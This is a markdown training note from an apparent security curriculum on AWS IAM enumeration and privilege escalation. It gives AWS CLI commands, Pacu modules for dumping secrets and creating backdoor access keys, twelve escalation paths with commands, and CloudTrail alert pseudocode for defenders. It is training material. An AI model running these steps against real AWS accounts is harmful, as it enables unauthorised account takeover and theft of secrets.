---
title: "Weak Area Reinforcement Day 8 — AWS IAM Deep Dive and Cloud Automation"
tags: [reinforcement, AWS, IAM, cloud, pacu, enumerate-iam, automation, practice,
       bug-bounty]
module: 05-BugBountyOps-02
day: 323
related_topics:
  - Weak Area Reinforcement Day 7 (Day 322)
  - HTB Cloud Series Day 1 (Day 306)
  - Cloud Exploitation (R-09)
---

# Day 323 — Weak Area Reinforcement Day 8: AWS IAM Deep Dive and Cloud Automation

---

## Goals

Drill AWS IAM enumeration and privilege escalation from first principles.
Build fluency with Pacu — the AWS exploitation framework equivalent of
Metasploit for cloud assessments.

**Time budget:** 3 hours.

---

## Part 1 — IAM Enumeration Without Tools

### Recon: Reading the IAM Surface Manually

```bash
# Given: AccessKeyId + SecretAccessKey (no session token = IAM user, not role)

# 1. Who am I?
aws sts get-caller-identity

# 2. What policies am I attached to?
aws iam list-attached-user-policies --user-name $(aws iam get-user --query 'User.UserName' --output text)

# 3. What inline policies do I have?
aws iam list-user-policies --user-name MY_USER

# 4. What groups am I in?
aws iam list-groups-for-user --user-name MY_USER

# 5. Get all policy documents (must iterate per policy)
aws iam get-policy --policy-arn POLICY_ARN
aws iam get-policy-version --policy-arn POLICY_ARN --version-id v1

# 6. What roles can I list?
aws iam list-roles

# 7. What roles can I assume? (must check trust policy of each)
# Trust policy with "Principal": {"AWS": "arn:aws:iam::ACCOUNT:user/MY_USER"}
# → I can assume this role
aws sts assume-role --role-arn ROLE_ARN --role-session-name test
```

---

## Part 2 — Pacu: AWS Exploitation Framework

### Installation and Setup

```bash
# Install
pip3 install pacu
# or
git clone https://github.com/RhinoSecurityLabs/pacu
cd pacu && pip3 install -r requirements.txt

# Start Pacu
python3 pacu.py

# Create new session
Pacu > new_session TARGET_NAME

# Import credentials
Pacu > set_keys
# Enter AccessKeyId, SecretAccessKey, SessionToken (if role)

# View current keys
Pacu > whoami
```

### Core Pacu Modules

```
Module                          Purpose
------------------------------- ------------------------------------------
iam__enum_users_roles_policies  Enumerate all IAM users, roles, policies
iam__enum_permissions           Simulate all API calls to map permissions
iam__privesc_scan               Identify privilege escalation paths
s3__enum                        List all S3 buckets and test permissions
ec2__enum                       List EC2 instances, security groups, keys
lambda__enum                    List Lambda functions
ssm__params                     Dump SSM Parameter Store (secrets)
secretsmanager__secret          Dump Secrets Manager
iam__backdoor_users_keys        Create backdoor access keys (post-exploit)
```

```bash
# Enumerate all permissions
Pacu > run iam__enum_permissions

# Scan for privilege escalation paths
Pacu > run iam__privesc_scan

# Dump S3
Pacu > run s3__enum

# Dump secrets
Pacu > run ssm__params
Pacu > run secretsmanager__secret
```

---

## Part 3 — IAM Privilege Escalation Drill

### The 12 IAM Escalation Paths (Rhino Security)

Practice identifying which path applies given a set of permissions:

```
Given permissions → Escalation path:

iam:CreatePolicyVersion
  → Create new policy version with admin rights
  → aws iam create-policy-version --policy-arn ARN
       --policy-document '{"Version":"2012-10-17",
                           "Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
       --set-as-default

iam:SetDefaultPolicyVersion
  → If an old version of a policy had more permissions
  → aws iam set-default-policy-version --policy-arn ARN --version-id v1

iam:AttachUserPolicy
  → Attach AdministratorAccess directly to self
  → aws iam attach-user-policy --user-name ME
       --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

iam:AttachGroupPolicy
  → Attach to a group I am a member of
  → aws iam attach-group-policy --group-name MYGROUP ...

iam:AttachRolePolicy
  → Attach to a role I can assume

iam:PutUserPolicy (inline)
  → Create inline policy with admin rights

iam:CreateAccessKey for another user
  → Create keys for an admin user
  → aws iam create-access-key --user-name admin

iam:UpdateLoginProfile
  → Change console password for an admin user

iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction
  → Create Lambda with admin role → invoke → get env credentials

iam:PassRole + ec2:RunInstances
  → Launch EC2 with admin role → reach instance metadata

iam:CreateLoginProfile
  → If admin user has no console password, create one

iam:UpdateAssumeRolePolicy
  → Modify a role's trust policy to allow yourself to assume it
```

```
Permissions available in lab: ___
Escalation path selected: ___
Commands executed: ___
Final identity: ___
```

---

## Part 4 — CloudTrail Detection (Defender Perspective)

```
For each escalation path above — what CloudTrail event is logged?

iam:CreatePolicyVersion    → CreatePolicyVersion event
iam:AttachUserPolicy       → AttachUserPolicy event
iam:CreateAccessKey        → CreateAccessKey event (especially for other users)
sts:AssumeRole             → AssumeRole event in CloudTrail

Alert rule (pseudocode):
  IF CreatePolicyVersion AND setAsDefault=true AND policy is customer-managed
  → Alert: potential IAM privilege escalation

  IF CreateAccessKey AND target_user != request_user
  → Alert: access key created for another user

  IF AssumeRole AND role has AdministratorAccess
  → Alert: high-privilege role assumption
```

---

## Post-Drill Rating

```
Area                              | Before | After
----------------------------------|--------|-------
AWS IAM enumeration (manual)      |   /5   |  /5
AWS IAM escalation paths          |   /5   |  /5
Pacu module usage                 |   /5   |  /5
CloudTrail detection               |   /5   |  /5

Escalation path I could not do from memory before today:
  ___
```

---

## Questions

> Add your questions here. Each question gets a Global ID (Q323.1, Q323.2 …).

---

## Navigation

← Previous: [Day 322 — Weak Area Reinforcement Day 7](DAY-0322-Weak-Area-Reinforcement-Day-07.md)
→ Next: [Day 324 — Weak Area Reinforcement Day 9](DAY-0324-Weak-Area-Reinforcement-Day-09.md)
